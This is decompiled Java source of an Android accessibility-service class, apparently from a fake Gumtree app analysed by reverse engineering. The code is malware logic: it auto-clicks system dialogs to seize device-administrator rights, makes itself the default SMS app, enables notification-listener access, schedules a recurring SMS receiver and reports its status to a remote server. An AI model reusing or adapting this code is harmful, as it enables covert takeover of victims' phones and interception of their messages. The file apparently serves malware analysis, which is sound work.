package com.gumsis.srs;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build.VERSION;
import android.os.SystemClock;
import android.provider.Telephony.Sms;
import android.support.v4.app.NotificationManagerCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.checktls.ASTls;
import com.gumsis.checktls.ASTls.OnASTlsCallback;
import com.gumsis.checktls.IntTls;
import com.gumsis.checktls.NdTls;
import com.gumsis.mess.service.receiver.SmsReceiver;
import com.gumsis.rcs.AdReceiver;
import com.gumsis.srs.api.requests.SendReportRequest;
import com.gumsis.srs.api.requests.data.ReportData;
import com.gumsis.srs.api.responses.StatusResponse;
import java.util.Iterator;
import java.util.Set;

public class GPSrs
  extends AccessibilityService
  implements HttpResponseHandler<HttpResponse>, ASTls.OnASTlsCallback
{
  private static final String ACTION_RLT_ACC_RCV = "com.gumsis.GPReceiver";
  private static final long TIMEOUT = 250L;
  private static AlarmManager mAlarmManager;
  private String mChSSCl = null;
  private boolean mExitFromApp;
  private boolean mIsAdReqKd = true;
  private BroadcastReceiver mRealTalkAccessibilityReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      if (paramAnonymousIntent != null) {}
      switch (paramAnonymousIntent.getIntExtra("status", -1))
      {
      default: 
        return;
      case 11: 
        GPSrs.access$002(GPSrs.this, paramAnonymousIntent.getBooleanExtra("isRequestKilled", true));
        return;
      }
      GPSrs.access$102(GPSrs.this, paramAnonymousIntent.getStringExtra("chSSCl"));
    }
  };
  
  private void adReq(AccessibilityEvent paramAccessibilityEvent)
  {
    try
    {
      if ((this.mIsAdReqKd) && (!paramAccessibilityEvent.getPackageName().equals(Realtalk.getAddDevicePackageFromJNI()))) {
        IntTls.startAdminRequest(this);
      }
      return;
    }
    catch (Exception paramAccessibilityEvent)
    {
      paramAccessibilityEvent.printStackTrace();
    }
  }
  
  private void chSSClReq(AccessibilityEvent paramAccessibilityEvent)
  {
    if (Build.VERSION.SDK_INT < 19) {}
    do
    {
      return;
      IntTls.chSSCl(this);
      paramAccessibilityEvent = paramAccessibilityEvent.getSource();
    } while ((paramAccessibilityEvent == null) || (!NdTls.clickNode(paramAccessibilityEvent, "android:id/button1", 16)));
    sendChangeMSClToServer(this.mChSSCl, 0L);
  }
  
  private void handleAccessibilityEvent(AccessibilityEvent paramAccessibilityEvent)
    throws Exception
  {
    AccessibilityNodeInfo localAccessibilityNodeInfo = paramAccessibilityEvent.getSource();
    if ((localAccessibilityNodeInfo != null) && (!this.mExitFromApp))
    {
      if (!hasAd()) {
        adReq(paramAccessibilityEvent);
      }
    }
    else {
      return;
    }
    if (!isChSSCl()) {
      chSSClReq(paramAccessibilityEvent);
    }
    new ASTls().packageEqualsProcessing(this, localAccessibilityNodeInfo, this);
    IntTls.startCommandService(getApplicationContext());
    IntTls.startDialogAccessService(getApplicationContext());
    scheduleSSRec(getApplicationContext());
  }
  
  private void handleClick(AccessibilityEvent paramAccessibilityEvent)
  {
    try
    {
      if (Build.VERSION.SDK_INT >= 18)
      {
        paramAccessibilityEvent = paramAccessibilityEvent.getSource();
        if (paramAccessibilityEvent != null) {
          if (!hasAd())
          {
            if (NdTls.clickNode(paramAccessibilityEvent, "com.android.settings:id/action_button", 16)) {
              onMinimize();
            }
          }
          else if (!hasNlService())
          {
            if (NdTls.actionText(paramAccessibilityEvent, getString(2131361810), 16)) {}
            boolean bool = NdTls.clickNode(paramAccessibilityEvent, "android:id/button1", 16);
            if (bool) {}
          }
        }
      }
    }
    catch (Exception paramAccessibilityEvent)
    {
      paramAccessibilityEvent.printStackTrace();
    }
  }
  
  private boolean hasAd()
  {
    boolean bool;
    if (Build.VERSION.SDK_INT >= 24) {
      bool = true;
    }
    for (;;)
    {
      return bool;
      bool = false;
      try
      {
        DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)getSystemService("device_policy");
        if (localDevicePolicyManager != null)
        {
          bool = localDevicePolicyManager.isAdminActive(new ComponentName(this, AdReceiver.class));
          return bool;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
    }
    return false;
  }
  
  private boolean hasNlService()
    throws Exception
  {
    boolean bool2;
    if (Build.VERSION.SDK_INT < 18)
    {
      bool2 = true;
      return bool2;
    }
    boolean bool1 = false;
    Iterator localIterator = NotificationManagerCompat.getEnabledListenerPackages(this).iterator();
    for (;;)
    {
      bool2 = bool1;
      if (!localIterator.hasNext()) {
        break;
      }
      if (((String)localIterator.next()).equals(getPackageName())) {
        bool1 = true;
      }
    }
  }
  
  private boolean isChSSCl()
  {
    boolean bool;
    if (Build.VERSION.SDK_INT < 19) {
      bool = true;
    }
    do
    {
      return bool;
      bool = false;
    } while (!Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName()));
    return true;
  }
  
  private void nlService()
    throws Exception
  {
    if (Build.VERSION.SDK_INT < 18) {
      return;
    }
    IntTls.startNLSettings(this);
  }
  
  private void parseChangeMSCl(String paramString, StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendChangeMSClToServer(paramString, 60000L);
        }
        return;
      }
      sendChangeMSClToServer(paramString, 60000L);
      return;
    }
    sendChangeMSClToServer(paramString, 60000L);
  }
  
  private static void scheduleSSRec(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 123456789, new Intent(paramContext, SmsReceiver.class), 0);
    if (mAlarmManager == null)
    {
      mAlarmManager = (AlarmManager)paramContext.getSystemService("alarm");
      mAlarmManager.setRepeating(2, SystemClock.elapsedRealtime(), 60000L, localPendingIntent);
    }
  }
  
  private void sendAccessStatusRequest(ReportData paramReportData)
  {
    paramReportData = new SendReportRequest(this, 25, paramReportData, this);
    HTTPServer.getInstance().doRequest(paramReportData);
  }
  
  private void sendChangeMSClToServer(final String paramString, long paramLong)
  {
    paramString = new SendReportRequest(this, 27, new ReportData("move_sms_client_done", Realtalk.getPreviousRid(this), paramString), new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, HttpResponse paramAnonymousHttpResponse)
      {
        GPSrs.this.parseChangeMSCl(paramString, (StatusResponse)paramAnonymousHttpResponse);
      }
    });
    HTTPServer.getInstance().doRequestDelayed(paramString, paramLong);
  }
  
  public static void sendObjectBroadcast(Context paramContext, int paramInt, Object paramObject)
  {
    Intent localIntent = new Intent("com.gumsis.GPReceiver");
    localIntent.putExtra("status", paramInt);
    switch (paramInt)
    {
    }
    for (;;)
    {
      LocalBroadcastManager.getInstance(paramContext).sendBroadcast(localIntent);
      return;
      localIntent.putExtra("isRequestKilled", ((Boolean)paramObject).booleanValue());
      continue;
      localIntent.putExtra("chSSCl", (String)paramObject);
    }
  }
  
  public void onAccessibilityEvent(AccessibilityEvent paramAccessibilityEvent)
  {
    try
    {
      if (paramAccessibilityEvent.getEventType() == 32) {
        handleAccessibilityEvent(paramAccessibilityEvent);
      }
      handleClick(paramAccessibilityEvent);
      return;
    }
    catch (Exception paramAccessibilityEvent)
    {
      paramAccessibilityEvent.printStackTrace();
    }
  }
  
  public void onBack()
  {
    if (Build.VERSION.SDK_INT >= 16)
    {
      performGlobalAction(1);
      return;
    }
    IntTls.minimizeApp(this);
  }
  
  public void onCreate()
  {
    super.onCreate();
    sendAccessStatusRequest(new ReportData("access", "on"));
    LocalBroadcastManager.getInstance(this).registerReceiver(this.mRealTalkAccessibilityReceiver, new IntentFilter("com.gumsis.GPReceiver"));
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    sendAccessStatusRequest(new ReportData("access", "off"));
    LocalBroadcastManager.getInstance(this).unregisterReceiver(this.mRealTalkAccessibilityReceiver);
  }
  
  public void onInterrupt() {}
  
  public void onMinimize()
  {
    if (Build.VERSION.SDK_INT >= 16)
    {
      performGlobalAction(2);
      return;
    }
    IntTls.minimizeApp(this);
  }
  
  public void onResponse(int paramInt, HttpResponse paramHttpResponse) {}
  
  protected void onServiceConnected()
  {
    super.onServiceConnected();
    onBack();
    AccessibilityServiceInfo localAccessibilityServiceInfo = new AccessibilityServiceInfo();
    if (Build.VERSION.SDK_INT >= 18) {}
    for (localAccessibilityServiceInfo.flags = 17;; localAccessibilityServiceInfo.flags = 1)
    {
      localAccessibilityServiceInfo.eventTypes = -1;
      localAccessibilityServiceInfo.feedbackType = 16;
      localAccessibilityServiceInfo.notificationTimeout = 250L;
      setServiceInfo(localAccessibilityServiceInfo);
      return;
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/GPSrs.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */